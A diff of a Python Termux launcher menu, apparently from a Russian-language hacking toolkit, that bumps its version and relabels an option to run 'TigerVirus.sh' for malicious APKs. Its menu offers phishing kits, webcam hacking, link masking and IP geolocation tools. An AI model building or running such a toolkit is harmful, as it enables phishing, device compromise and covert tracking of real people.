@@ -24,14 +24,14 @@ def baner():
     
 while True:
     baner()
-    print(Style.BRIGHT, Fore.CYAN+"[Telegram: @SYPEXHACK]                         [v2.8.1]")
+    print(Style.BRIGHT, Fore.CYAN+"[Telegram: @SYPEXHACK]                         [v2.8.2]")
     res()
     print(Fore.GREEN+"    [1] Ngrok      >>  Тунелирование")
     print(Fore.GREEN+"    [2] Localhost  >>  Тунелирование")
     print(Fore.GREEN+"    [3] PyPhiser   >>  Фишинг")
     print(Fore.GREEN+"    [4] Zphisher   >>  Фишинг")
     print(Fore.GREEN+"    [5] CamPhish   >>  Взлом веб-камеры")
-    print(Fore.GREEN+"    [6] Android    >>  Вирус ссылка")
+    print(Fore.GREEN+"    [6] TigerVirus >>  Вирусы apk")
     print(Fore.GREEN+"    [7] Maskphish  >>  Замаскировать ссылку")
     print(Fore.GREEN+"    [8] IP-Tracer  >>  Пробив по IP")
     print(Fore.GREEN+"    [9] Seeker     >>  Узнать местоположения")
@@ -258,7 +258,7 @@ while True:
             os.system('clear')
             os.chdir('TigerVirus')
             os.system('bash TigerVirus.sh')
-            tsu_701 = input('\n [Нажмите enter чтобы выйти]')
+            tsu_601 = input('\n [Нажмите enter чтобы выйти]')
             os.chdir('/data/data/com.termux/files/home/installer')
             os.system('clear')
             
@@ -274,7 +274,7 @@ while True:
             os.system('clear')
             os.chdir('TigerVirus')
             os.system('bash TigerVirus.sh')
-            tsu_701 = input('\n [Нажмите enter чтобы выйти]')
+            tsu_601 = input('\n [Нажмите enter чтобы выйти]')
             os.chdir('/data/data/com.termux/files/home/installer')
             os.system('clear')
 
